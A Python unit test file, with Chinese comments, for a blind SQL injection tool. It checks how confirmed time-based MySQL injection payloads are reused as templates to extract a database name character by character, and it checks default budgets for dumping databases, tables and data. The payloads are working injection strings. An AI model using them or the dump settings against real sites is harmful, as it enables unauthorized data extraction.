# -*- coding: utf-8 -*-
"""盲注模板复用 + 深挖预算配置 单元测试。

运行：venv/Scripts/python tests/test_blind_template.py

背景（2026-11-11 hbc2:51696 实测）：确认 payload 是**无引号**数字型
`1 and if(1=1,sleep(3),1)-- -`，旧提取器硬拼 `1' AND IF(...)` → 校准失败。
修复后：从确认 payload 派生，保留引号/注释/编码，只替换判断条件。
"""
import sys
from pathlib import Path

sys.stdout.reconfigure(encoding="utf-8", errors="replace")
sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

import app.models  # noqa: F401
from app.core import config
from app.services.blind_extract import reuse_template, _split_top_level

passed, failed = [], []


def check(name, cond, extra=""):
    (passed if cond else failed).append(name)
    print(f"{'OK' if cond else 'FAIL'} {name} {extra}")


COND = "ascii(substring((database()),1,1))>64"


def test_no_quote_template():
    got = reuse_template("1 and if(1=1,sleep(3),1)-- -", COND, 2, "mysql")
    check("无引号语境保留前后文",
          got == f"1 and if(({COND}),sleep(2),1)-- -", repr(got))
    check("不擅自加引号", "1'" not in (got or ""), repr(got))


def test_quote_templates():
    got = reuse_template("1' and if(1=1,sleep(3),1)-- -", COND, 2, "mysql")
    check("单引号语境保留引号", got == f"1' and if(({COND}),sleep(2),1)-- -", repr(got))
    got = reuse_template('1" and if(1=1,sleep(3),1)-- -', COND, 2, "mysql")
    check("双引号语境保留引号", got == f'1" and if(({COND}),sleep(2),1)-- -', repr(got))
    got = reuse_template("1 AND IF(1=1,SLEEP(5),0)#", COND, 2, "mysql")
    check("大写/# 注释风格保留", got == f"1 AND IF(({COND}),sleep(2),0)#", repr(got))


def test_unusable_hints():
    check("无 IF 构造返回 None",
          reuse_template("1 and sleep(3)-- -", COND, 2, "mysql") is None)
    check("非 MySQL 返回 None",
          reuse_template("1 and case when 1=1 then pg_sleep(2) end",
                         COND, 2, "postgresql") is None)
    check("空 hint 返回 None", reuse_template("", COND, 2, "mysql") is None)


def test_split_top_level():
    check("顶层逗号切分", _split_top_level("a,(b,c),d") == ["a", "(b,c)", "d"])


def test_budget_defaults():
    cfg = config.DEFAULT_SCAN_CONFIG
    check("总预算已提高", cfg.get("deep_total_budget_s") == 1800,
          str(cfg.get("deep_total_budget_s")))
    check("库名预算 600", cfg.get("deep_blind_db_budget_s") == 600)
    check("表预算 600", cfg.get("deep_blind_tables_budget_s") == 600)
    check("脱裤预算 900", cfg.get("deep_blind_dump_budget_s") == 900)
    check("盲注线程默认 4", cfg.get("deep_sqlmap_threads") == 4)


def main():
    test_no_quote_template()
    test_quote_templates()
    test_unusable_hints()
    test_split_top_level()
    test_budget_defaults()
    print(f"\n通过 {len(passed)}，失败 {len(failed)}")
    if failed:
        print("失败项：", failed)
        sys.exit(1)


if __name__ == "__main__":
    main()
